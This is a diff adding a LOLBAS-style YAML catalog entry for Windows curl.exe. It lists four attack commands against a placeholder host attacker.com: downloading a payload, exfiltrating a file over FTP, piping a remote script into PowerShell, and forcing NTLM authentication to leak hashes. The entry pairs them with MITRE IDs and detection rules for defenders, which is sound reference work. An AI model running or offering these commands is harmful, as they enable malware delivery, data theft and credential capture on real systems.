@@ -1,0 +1,64 @@
+---
+Name: curl.exe
+Description: Command line tool and library for transferring data with URLs. Included in Windows 10 and later.
+Author: 'LOLBAS-Projekt Community'
+Created: 2026-06-10
+Commands:
+  - Command: curl.exe -o C:\path\to\local\file.exe http://attacker.com/malicious.exe
+    Description: Downloads a file from a remote URL to a local destination.
+    Usecase: Download malicious payload or tool onto the target machine.
+    Category: Download
+    Privileges: User
+    MitreID: T1105
+    OperatingSystem: Windows 10, Windows 11, Windows Server 2019, Windows Server 2022
+    Tags:
+      - Download: File
+  - Command: curl.exe -T C:\path\to\sensitive_data.zip ftp://attacker.com/upload/
+    Description: Uploads a specified local file to a remote server via FTP/HTTP.
+    Usecase: Exfiltrate sensitive data or system information out of the network.
+    Category: Exfiltration
+    Privileges: User
+    MitreID: T1048.003
+    OperatingSystem: Windows 10, Windows 11, Windows Server 2019, Windows Server 2022
+    Tags:
+      - Exfiltration: Upload
+  - Command: curl.exe http://attacker.com/script.ps1 | powershell -
+    Description: Downloads a remote script and pipes it directly into the PowerShell interpreter without saving it to disk.
+    Usecase: Fileless execution of a remote payload to evade disk-based AV scanners.
+    Category: Execute
+    Privileges: User
+    MitreID: T1059.001
+    OperatingSystem: Windows 10, Windows 11, Windows Server 2019, Windows Server 2022
+    Tags:
+      - Execute: Pipeline
+  - Command: curl.exe -u : --ntlm http://attacker-server/
+    Description: Forces NTLM authentication using the current Windows user's context (via SSPI) against a remote server. This leaks the user's NetNTLM hash to the remote host.
+    Usecase: Forced authentication to capture NetNTLM hashes for cracking or SMB relaying.
+    Category: Credential Access
+    Privileges: User
+    MitreID: T1187
+    OperatingSystem: Windows 10, Windows 11, Windows Server 2019, Windows Server 2022
+    Tags:
+      - Credential Access: Hash Leakage
+Full_Path:
+  - Path: C:\Windows\System32\curl.exe
+  - Path: C:\Windows\SysWOW64\curl.exe
+Code_Sample: []
+Detection:
+  - Sigma: proc_creation_win_curl_susp_download.yml
+  - Sigma: proc_creation_win_susp_curl_execution.yml
+  - Sigma: proc_creation_win_curl_ntlm_leak.yml
+  - IOC: Monitor curl.exe usage containing `--ntlm` or `-u :` pointing to external, untrusted, or non-internal IP addresses.
+  - IOC: Monitor curl.exe processes making outbound connections to unverified or public file-sharing IPs/domains.
+  - IOC: Monitoring command lines where curl.exe is piped directly into interpreters like cmd.exe or powershell.exe.
+Resources:
+  - Link: https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/curl
+  - Link: https://github.com/curl/curl/blob/master/lib/vauth/ntlm_sspi.c
+  - Link: https://attack.mitre.org/techniques/T1187/
+Acknowledgement: 
+  - Person: Arnim Rupp
+    Handle: '@ruppde'
+  - Person: Florian Roth
+    Handle: '@cyb3rops'
+  - Person: Jonathan Peters
+    Handle: '@cod3nym'  
